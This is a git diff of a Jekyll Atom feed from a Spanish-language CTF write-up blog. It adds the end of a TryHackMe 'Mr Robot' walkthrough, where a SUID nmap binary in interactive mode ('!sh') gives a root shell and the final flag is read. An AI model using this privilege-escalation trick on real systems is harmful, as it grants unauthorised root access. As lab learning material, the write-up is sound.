@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-09T23:46:54-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">Hackthebox: Secret</title><link href="http://localhost:4000/Secret/" rel="alternate" type="text/html" title="Hackthebox: Secret" /><published>2021-11-09T00:00:00-05:00</published><updated>2021-11-09T00:00:00-05:00</updated><id>http://localhost:4000/Secret</id><content type="html" xml:base="http://localhost:4000/Secret/">&lt;h2 id=&quot;iniciamos-comprobando-que-la-maquina-este-activa-antes-que-nada&quot;&gt;Iniciamos comprobando que la maquina este activa antes que nada&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-10T00:56:43-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">Hackthebox: Secret</title><link href="http://localhost:4000/Secret/" rel="alternate" type="text/html" title="Hackthebox: Secret" /><published>2021-11-09T00:00:00-05:00</published><updated>2021-11-09T00:00:00-05:00</updated><id>http://localhost:4000/Secret</id><content type="html" xml:base="http://localhost:4000/Secret/">&lt;h2 id=&quot;iniciamos-comprobando-que-la-maquina-este-activa-antes-que-nada&quot;&gt;Iniciamos comprobando que la maquina este activa antes que nada&lt;/h2&gt;
 
 &lt;p&gt;hacemos el envio de un paquete mediante ping para confirmar que la maquina esta activa, al mismo tiempo comprovamos que estamos
 frente a una maquina linux mediante el &lt;em&gt;ttl&lt;/em&gt;&lt;/p&gt;
@@ -94,7 +94,24 @@ by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span 
 &lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
 2021/11/09 08:35:09 Finished
 &lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="hackthebox" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Mr Robot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="tryhackme: Mr Robot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/">&lt;h1 id=&quot;comprobaremos-que-la-maquina-se-encuentre-activa&quot;&gt;Comprobaremos que la maquina se encuentre activa&lt;/h1&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="hackthebox" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">Mrrobot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="Mrrobot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/">&lt;p&gt;title: “tryhackme: Mr Robot”
+share: false
+excerpt: “El mejor metodo de aprendizaje es practicando”
+share: false
+header:
+  teaser:  /assets/images/MrRobot/logo.jpg
+  teaser_home_page: true
+categories:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;tryhackme
+tags:&lt;/li&gt;
+  &lt;li&gt;web&lt;/li&gt;
+  &lt;li&gt;
+    &lt;h2 id=&quot;wordpress&quot;&gt;wordpress&lt;/h2&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;comprobaremos-que-la-maquina-se-encuentre-activa&quot;&gt;Comprobaremos que la maquina se encuentre activa&lt;/h1&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.115.49
 PING 10.10.115.49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.115.49&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
@@ -317,7 +334,31 @@ robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quo
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;llama la atención que &lt;em&gt;nmap&lt;/em&gt; tenga privilegios SUID, probar usar &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nmap/#suid&quot;&gt;gtfobis&lt;/a&gt; 
-para abusar de dichos privilegios&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
+para abusar de dichos privilegios&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;
+/usr/local/bin/nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;
+
+Starting nmap V. 3.81 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://www.insecure.org/nmap/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Welcome to Interactive Mode &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; press h &amp;lt;enter&amp;gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;help
+&lt;/span&gt;nmap&amp;gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
+&lt;span class=&quot;c&quot;&gt;# id&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;ya somos usuarios &lt;em&gt;root&lt;/em&gt;, solo nos queda encontrar la &lt;em&gt;flag&lt;/em&gt; para completar la maquina&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cd root&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;root
+&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;firstboot_done	key-3-of-3.txt
+&lt;span class=&quot;c&quot;&gt;# cat key-3-of-3.txt&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-3-of-3.txt
+x4x8xxxef27x3dee1ex161bx1x7xbxe4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;maquina-terminada&quot;&gt;Maquina terminada&lt;/h2&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><summary type="html">title: “tryhackme: Mr Robot” share: false excerpt: “El mejor metodo de aprendizaje es practicando” share: false header: teaser: /assets/images/MrRobot/logo.jpg teaser_home_page: true categories: tryhackme tags: web wordpress</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.37.122
 PING 10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.37.122&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
